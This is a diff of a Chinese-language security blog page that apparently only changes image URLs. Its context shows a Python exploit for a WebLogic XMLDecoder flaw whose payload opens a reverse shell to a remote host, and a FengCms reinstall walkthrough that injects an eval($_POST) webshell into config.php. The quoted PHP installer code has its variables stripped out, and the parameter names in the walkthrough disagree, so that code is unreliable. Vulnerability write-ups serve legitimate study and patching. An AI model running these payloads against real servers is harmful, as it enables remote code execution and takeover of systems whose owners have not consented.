class="string">'''</span></span><br><span class="line"><span class="string">	&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">	&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span></span><br><span class="line"><span class="string">	&lt;void class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">	&lt;array class="java.lang.String" length="3"&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="0"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="1"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="2"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.102/21 0&amp;gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/array&gt;</span></span><br><span class="line"><span class="string">	&lt;void method="start"/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/java&gt;</span></span><br><span class="line"><span class="string">	&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line"></span><br><span class="line">    respond = requests.post(url=url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span>(respond.status_code == <span class="number">500</span>):</span><br><span class="line">        print(<span class="string">'success'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.1.101:7001/wls-wsat/CoordinatorPortType"</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure>
 
@@ -2017,7 +2017,7 @@
 <p>我们再来看看<code>Install/install.php</code>文件，代码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// = fopen(, "w");   //以写入的方式打开config.php这个文件。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'install'</span>])&#123;  <span class="comment">//获取用户提交的数据。  </span></span><br><span class="line">=[<span class="string">'host'</span>];  </span><br><span class="line">=[<span class="string">'user'</span>];  </span><br><span class="line">=[<span class="string">'password'</span>];  </span><br><span class="line">=[<span class="string">'dbname'</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!=@mysql_connect(,,))&#123;  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"连接数据库失败！请返回上一页检查连接参数 返回修改"</span>;  </span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  mysql_query(<span class="string">"set names gb2312"</span>);  <span class="comment">//设置数据库的编码，注意要与前面一致。  </span></span><br><span class="line">   <span class="keyword">if</span>(!mysql_select_db(,))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。  </span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(!mysql_query())&#123;  </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"创建数据库失败，请确认是否有足够的权限！返回修改"</span>;  </span><br><span class="line">           <span class="keyword">exit</span>();  </span><br><span class="line">          &#125;  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">     = fopen(, <span class="string">"w"</span>);   <span class="comment">//以写入的方式打开config.php这个文件。  </span></span><br><span class="line">    fwrite(,);  <span class="comment">//将配置信息写入config.php文件。  </span></span><br><span class="line">    fclose();  </span><br><span class="line">    <span class="keyword">include_once</span>(ABS_PATH.<span class="string">"config.php"</span>);   <span class="comment">//导入配置信息.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。  </span></span><br><span class="line">   <span class="comment">//新建一个表test1  </span></span><br><span class="line">   [] = <span class="string">"CREATE TABLE `test1` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">    <span class="comment">//新建一个表test2  </span></span><br><span class="line">    [] = <span class="string">"CREATE TABLE `test2` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">     <span class="comment">//为test1表默认初始化一些数据。  </span></span><br><span class="line">     []=<span class="string">"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')"</span>;  </span><br><span class="line">     <span class="keyword">foreach</span>( <span class="keyword">as</span> )&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!mysql_query())&#123;      <span class="comment">//依次执行以上的sql语句，就是创建表和初始化数据。  </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"创建表失败或者初始化数据失败"</span>;  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">     mysql_close();  </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"安装成功"</span>;<span class="comment">//可以做一个跳转到首页。  </span></span><br><span class="line">     <span class="keyword">exit</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件：</p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
 <p>我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
 <p>这样我们就可以通过参数<code>a</code> ，去执行任意的代码。</p>
@@ -2025,11 +2025,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/install/index.php</span><br></pre></td></tr></table></figure>
 <p>上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
 <p>当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。</p>
 <p>接下来访问<code>127.0.0.1</code> ，使用Post方式提交数据<code>a=phpinfo();</code> </p>
-<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
 <p>。。。</p>
 <p>成功利用了FengCms重装漏洞。</p>
 <p><strong>修复建议</strong></p>
